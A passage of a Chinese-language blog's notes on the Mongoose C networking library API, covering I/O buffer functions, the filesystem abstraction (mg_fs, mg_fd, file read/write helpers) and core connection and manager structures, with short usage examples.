<li>调整IO缓冲区的大小，将新的大小设置为size。在此之后，io-&gt;buf指针可能会发生变化，例如缓冲区变大。如果size为0，则释放io-&gt;buf并将其设置为NULL，同时将size和len都设置为0。 得到的io-&gt;size总是与io-&gt;align字节边界对齐；因此，为了避免内存碎片和频繁的重新分配，将io-&gt;align设置为更高的值。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mg_iobuf_resize</span><span class="params">(<span class="keyword">struct</span> mg_iobuf *io, <span class="type">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>io   – 需要调整大小的iobuf</li>
<li>size – 新的大小</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>1 – 成功</li>
<li>0 – 失败</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> io;</span><br><span class="line"><span class="built_in">mg_iobuf_init</span>(&amp;io, <span class="number">0</span>, <span class="number">10</span>);  <span class="comment">// An empty buffer with 10-byte alignment</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">mg_iobuf_resize</span>(&amp;io, <span class="number">1</span>)) &#123;</span><br><span class="line">  <span class="comment">// New io size is 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-iobuf-free"><a href="#mg-iobuf-free" class="headerlink" title="mg_iobuf_free"></a>mg_iobuf_free</h2><ul>
<li><p>简介：</p>
<ul>
<li>释放io-&gt;buf指向的内存并设置为NULL。size和len都被设置为0。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_iobuf_free</span><span class="params">(<span class="keyword">struct</span> mg_iobuf *io)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>io – 需要释放的iobuf</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> io;</span><br><span class="line"><span class="comment">// IO buffer initialization</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Time to cleanup</span></span><br><span class="line"><span class="built_in">mg_iobuf_free</span>(&amp;io);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-iobuf-add"><a href="#mg-iobuf-add" class="headerlink" title="mg_iobuf_add"></a>mg_iobuf_add</h2><ul>
<li><p>简介：</p>
<ul>
<li>在偏移量处插入数据缓冲区buf、len。如果需要，iobuf将被扩展。产生的io-&gt;size总是与io-&gt;align字节边界对齐；因此，为了避免内存碎片和频繁的重新分配，将align设置为一个较大的值。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_iobuf_add</span><span class="params">(<span class="keyword">struct</span> mg_iobuf *io, <span class="type">size_t</span> offset, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>io     – 需要追加数据的iobuf</li>
<li>offset – 追加数据的偏移</li>
<li>buf    – 追加的数据</li>
<li>len    – 追加数据的长度</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>更新后iobuf的长度</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> io;         <span class="comment">// Declare buffer</span></span><br><span class="line"><span class="built_in">mg_iobuf_init</span>(&amp;io, <span class="number">0</span>, <span class="number">16</span>);  <span class="comment">// Initialise empty buffer with 16 byte alignment</span></span><br><span class="line"><span class="built_in">mg_iobuf_add</span>(&amp;io, io.len, <span class="string">&quot;hello&quot;</span>, <span class="number">5</span>);  <span class="comment">// Append &quot;hello&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-iobuf-del"><a href="#mg-iobuf-del" class="headerlink" title="mg_iobuf_del"></a>mg_iobuf_del</h2><ul>
<li><p>简介：</p>
<ul>
<li>删除从偏移量开始的len字节，并移动剩余的字节。如果len大于io-&gt;len，则不会发生任何操作，因此这种调用会被忽略。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_iobuf_del</span><span class="params">(<span class="keyword">struct</span> mg_iobuf *io, <span class="type">size_t</span> offset, <span class="type">size_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>io – 需要删除数据的iobuf</li>
<li>offset – 开始位置的偏移量</li>
<li>len – 删除的字节数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>更新后iobuf的长度</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> io;</span><br><span class="line"><span class="built_in">mg_iobuf_init</span>(&amp;io, <span class="number">0</span>, <span class="number">16</span>);          <span class="comment">// Empty buffer, 16-bytes aligned</span></span><br><span class="line"><span class="built_in">mg_iobuf_add</span>(&amp;io, <span class="number">0</span>, <span class="string">&quot;hello&quot;</span>, <span class="number">2</span>);   <span class="comment">// io-&gt;len is 5, io-&gt;size is 16</span></span><br><span class="line"><span class="built_in">mg_iobuf_del</span>(&amp;io, <span class="number">1</span>, <span class="number">3</span>);            <span class="comment">// io-&gt;len is 2, io-&gt;size is still 16</span></span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_file_system/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_file_system/" class="post-title-link" itemprop="url">mongoose_file_system</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>文件相关api</li>
</ul>
<h2 id="struct-mg-fd"><a href="#struct-mg-fd" class="headerlink" title="struct mg_fd"></a>struct mg_fd</h2><ul>
<li><p>简介：</p>
<ul>
<li>文件系统虚拟化层</li>
<li>Mongoose允许覆盖文件IO操作，以支持不同的存储设备，如可编程的闪存，无文件系统设备等。为了实现这一点，Mongoose提供了一个结构mg_fs API来指定一个自定义的文件系统。除此之外，Mongoose还提供了几个内置的API–一个标准的POSIX，FatFS，和一个 “打包的FS “API：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">mg_fs</span> <span class="title">mg_fs_posix</span>;</span>   <span class="comment">// POSIX open/close/read/write/seek</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">mg_fs</span> <span class="title">mg_fs_packed</span>;</span>  <span class="comment">// Packed FS, see examples/device-dashboard</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">mg_fs</span> <span class="title">mg_fs_fat</span>;</span>     <span class="comment">// FAT FS</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_fs</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> (*st)(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">size_t</span> *size, <span class="type">time_t</span> *mtime);  <span class="comment">// stat file</span></span><br><span class="line">  <span class="type">void</span> (*ls)(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">void</span> (*fn)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *), <span class="type">void</span> *);</span><br><span class="line">  <span class="type">void</span> *(*op)(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> flags);             <span class="comment">// Open file</span></span><br><span class="line">  <span class="type">void</span> (*cl)(<span class="type">void</span> *fd);                                 <span class="comment">// Close file</span></span><br><span class="line">  <span class="type">size_t</span> (*rd)(<span class="type">void</span> *fd, <span class="type">void</span> *buf, <span class="type">size_t</span> len);        <span class="comment">// Read file</span></span><br><span class="line">  <span class="type">size_t</span> (*wr)(<span class="type">void</span> *fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len);  <span class="comment">// Write file</span></span><br><span class="line">  <span class="type">size_t</span> (*sk)(<span class="type">void</span> *fd, <span class="type">size_t</span> offset);                <span class="comment">// Set file position</span></span><br><span class="line">  <span class="type">bool</span> (*mv)(<span class="type">const</span> <span class="type">char</span> *from, <span class="type">const</span> <span class="type">char</span> *to);         <span class="comment">// Rename file</span></span><br><span class="line">  <span class="type">bool</span> (*rm)(<span class="type">const</span> <span class="type">char</span> *path);                         <span class="comment">// Delete file</span></span><br><span class="line">  <span class="type">bool</span> (*mkd)(<span class="type">const</span> <span class="type">char</span> *path);                        <span class="comment">// Create directory</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> MG_FS_READ = <span class="number">1</span>, MG_FS_WRITE = <span class="number">2</span>, MG_FS_DIR = <span class="number">4</span> &#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="struct-mg-fd-1"><a href="#struct-mg-fd-1" class="headerlink" title="struct mg_fd"></a>struct mg_fd</h2><ul>
<li><p>简介：</p>
<ul>
<li>已打开的文件抽象。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_fd</span> &#123;</span></span><br><span class="line">  <span class="type">void</span> *fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_fs</span> *<span class="title">fs</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-fs-open"><a href="#mg-fs-open" class="headerlink" title="mg_fs_open"></a>mg_fs_open</h2><ul>
<li><p>简介：</p>
<ul>
<li>在一个给定的文件系统中打开一个文件</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_fd *<span class="title function_">mg_fs_open</span><span class="params">(<span class="keyword">struct</span> mg_fs *fs, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>fs : 一个文件系统的实现</li>
<li>path : 一个文件路径</li>
<li>flags : 所需的标志，是MG_FS_READ和MG_FS_WRITE的组合。</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功： 一个非NULL的已打开的描述符、</li>
<li>失败： NULL</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_fd</span> *<span class="title">fd</span> =</span> mg_fs_open(&amp;mg_fs_posix, <span class="string">&quot;/tmp/data.json&quot;</span>, MG_FS_WRITE);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-fs-close"><a href="#mg-fs-close" class="headerlink" title="mg_fs_close"></a>mg_fs_close</h2><ul>
<li><p>简介：</p>
<ul>
<li>关闭一个已打开的文件描述符</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_fs_close</span><span class="params">(<span class="keyword">struct</span> mg_fd *fd)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>fd : 一个已打开的文件描述符</li>
</ul>
</li>
<li><p>返回自：</p>
<ul>
<li>无</li>
</ul>
</li>
</ul>
<h2 id="mg-file-read"><a href="#mg-file-read" class="headerlink" title="mg_file_read"></a>mg_file_read</h2><ul>
<li><p>简介：</p>
<ul>
<li>在内存中读取整个文件。</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">mg_file_read</span><span class="params">(<span class="keyword">struct</span> mg_fs *fs, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">size_t</span> *size)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数</p>
<ul>
<li>fs : 一个文件系统的实现</li>
<li>path : 一个文件路径</li>
<li>size : 如果不是NULL，将包含所读文件的大小。</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功时，一个指向文件数据的指针，该指针保证为0端。</li>
<li>错误时，为NULL</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *data = mg_file_read(&amp;mg_fs_packed, <span class="string">&quot;/data.json&quot;</span>, &amp;size);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-file-write"><a href="#mg-file-write" class="headerlink" title="mg_file_write"></a>mg_file_write</h2><ul>
<li><p>简介：</p>
<ul>
<li>写入一段数据buf，len到一个文件路径。如果该文件不存在，它将被创建。之前的内容，如果有的话，会被删除。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">mg_file_write</span><span class="params">(<span class="keyword">struct</span> mg_fs *fs, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>fs : 一个文件系统的实现</li>
<li>path : 一个文件路径</li>
<li>buf : 一个指向待写数据的指针</li>
<li>len : 待写数据的大小</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功, true</li>
<li>失败, false</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_file_write(&amp;mg_fs_fat, <span class="string">&quot;/test.txt&quot;</span>, <span class="string">&quot;hi\n&quot;</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-file-printf"><a href="#mg-file-printf" class="headerlink" title="mg_file_printf"></a>mg_file_printf</h2><ul>
<li><p>简介：</p>
<ul>
<li>写一个打印格式的数据到一个文件路径。如果该文件不存在，它将被创建。之前的内容（如果有的话）被删除</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">mg_file_printf</span><span class="params">(<span class="keyword">struct</span> mg_fs *fs, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>fs : 一个文件系统的实现</li>
<li>path : 一个文件路径</li>
<li>fmt : printf语义中的格式字符串。支持的格式指定器的列表见mg_snprintf。</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功, true</li>
<li>失败, false</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_file_printf(&amp;mg_fs_fat, <span class="string">&quot;/test.txt&quot;</span>, <span class="string">&quot;%s\n&quot;</span>, <span class="string">&quot;hi&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_core/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_core/" class="post-title-link" itemprop="url">mongoose_core</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose核心api笔记</li>
</ul>
<h2 id="struct-mg-addr"><a href="#struct-mg-addr" class="headerlink" title="struct mg_addr"></a>struct mg_addr</h2><ul>
<li><p>简介：</p>
<ul>
<li>该结构包含网络地址。它可以被认为<code>sockaddr</code>结构在Mongoose中的等价结构体</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_addr</span> &#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> port;    <span class="comment">// TCP or UDP port in network byte order</span></span><br><span class="line">  <span class="type">uint32_t</span> ip;      <span class="comment">// IP address in network byte order</span></span><br><span class="line">  <span class="type">uint8_t</span> ip6[<span class="number">16</span>];  <span class="comment">// IPv6 address</span></span><br><span class="line">  <span class="type">bool</span> is_ip6;      <span class="comment">// True when address is IPv6 address</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="struct-mg-mgr"><a href="#struct-mg-mgr" class="headerlink" title="struct mg_mgr"></a>struct mg_mgr</h2><ul>
<li><p>简介：</p>
<ul>
<li>它是一个事件管理结构体，能够保存一个正在活动的连接列表，以及一些维持管理的信息</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_mgr</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_connection</span> *<span class="title">conns</span>;</span>  <span class="comment">// List of active connections  结构体数组</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_dns</span> <span class="title">dns4</span>;</span>           <span class="comment">// DNS for IPv4</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_dns</span> <span class="title">dns6</span>;</span>           <span class="comment">// DNS for IPv6</span></span><br><span class="line">  <span class="type">int</span> dnstimeout;               <span class="comment">// DNS resolve timeout in milliseconds</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> nextid;         <span class="comment">// Next connection ID</span></span><br><span class="line">  <span class="type">void</span> *userdata;               <span class="comment">// Arbitrary user data pointer</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="struct-mg-connection"><a href="#struct-mg-connection" class="headerlink" title="struct mg_connection"></a>struct mg_connection</h2><ul>
<li><p>简介：</p>
<ul>
<li>它是一个连接：可能是一个监听连接，或者是一个已接收连接，或者是一个出站连接</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_connection</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_connection</span> *<span class="title">next</span>;</span>  <span class="comment">// Linkage in struct mg_mgr :: connections</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_mgr</span> *<span class="title">mgr</span>;</span>          <span class="comment">// Our container</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_addr</span> <span class="title">loc</span>;</span>          <span class="comment">// Local address</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_addr</span> <span class="title">rem</span>;</span>          <span class="comment">// Remote address</span></span><br><span class="line">  <span class="type">void</span> *fd;                    <span class="comment">// Connected socket, or LWIP data</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> id;            <span class="comment">// Auto-incrementing unique connection ID</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_iobuf</span> <span class="title">recv</span>;</span>        <span class="comment">// Incoming data</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_iobuf</span> <span class="title">send</span>;</span>        <span class="comment">// Outgoing data</span></span><br><span class="line">  <span class="type">mg_event_handler_t</span> fn;       <span class="comment">// User-specified event handler function</span></span><br><span class="line">  <span class="type">void</span> *fn_data;               <span class="comment">// User-specified function parameter</span></span><br><span class="line">  <span class="type">mg_event_handler_t</span> pfn;      <span class="comment">// Protocol-specific handler function</span></span><br><span class="line">  <span class="type">void</span> *pfn_data;              <span class="comment">// Protocol-specific function parameter</span></span><br><span class="line">  <span class="type">char</span> label[<span class="number">50</span>];              <span class="comment">// Arbitrary label</span></span><br><span class="line">  <span class="type">void</span> *tls;                   <span class="comment">// TLS specific data</span></span><br><span class="line">  <span class="type">unsigned</span> is_listening : <span class="number">1</span>;   <span class="comment">// Listening connection</span></span><br><span class="line">  <span class="type">unsigned</span> is_client : <span class="number">1</span>;      <span class="comment">// Outbound (client) connection</span></span><br><span class="line">  <span class="type">unsigned</span> is_accepted : <span class="number">1</span>;    <span class="comment">// Accepted (server) connection</span></span><br><span class="line">  <span class="type">unsigned</span> is_resolving : <span class="number">1</span>;   <span class="comment">// Non-blocking DNS resolve is in progress</span></span><br><span class="line">  <span class="type">unsigned</span> is_connecting : <span class="number">1</span>;  <span class="comment">// Non-blocking connect is in progress</span></span><br><span class="line">  <span class="type">unsigned</span> is_tls : <span class="number">1</span>;         <span class="comment">// TLS-enabled connection</span></span><br><span class="line">  <span class="type">unsigned</span> is_tls_hs : <span class="number">1</span>;      <span class="comment">// TLS handshake is in progress</span></span><br><span class="line">  <span class="type">unsigned</span> is_udp : <span class="number">1</span>;         <span class="comment">// UDP connection</span></span><br><span class="line">  <span class="type">unsigned</span> is_websocket : <span class="number">1</span>;   <span class="comment">// WebSocket connection</span></span><br><span class="line">  <span class="type">unsigned</span> is_hexdumping : <span class="number">1</span>;  <span class="comment">// Hexdump in/out traffic</span></span><br><span class="line">  <span class="type">unsigned</span> is_draining : <span class="number">1</span>;    <span class="comment">// Send remaining data, then close and free</span></span><br><span class="line">  <span class="type">unsigned</span> is_closing : <span class="number">1</span>;     <span class="comment">// Close and free the connection immediately</span></span><br><span class="line">  <span class="type">unsigned</span> is_full : <span class="number">1</span>;        <span class="comment">// Stop reads, until cleared</span></span><br><span class="line">  <span class="type">unsigned</span> is_resp : <span class="number">1</span>;        <span class="comment">// Response is still being generated</span></span><br><span class="line">  <span class="type">unsigned</span> is_readable : <span class="number">1</span>;    <span class="comment">// Connection is ready to read</span></span><br><span class="line">  <span class="type">unsigned</span> is_writable : <span class="number">1</span>;    <span class="comment">// Connection is ready to write</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-mgr-init"><a href="#mg-mgr-init" class="headerlink" title="mg_mgr_init"></a>mg_mgr_init</h2><ul>
<li><p>简介：</p>
<ul>
<li>初始化事件管理器结构体变量，它所做的工作：<ul>
<li>将活动连接的列表设置为null</li>
<li>设置IPv4和IPv6的默认DNS服务器</li>
<li>设置默认DNS查找超时</li>
</ul>
</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_mgr_init</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
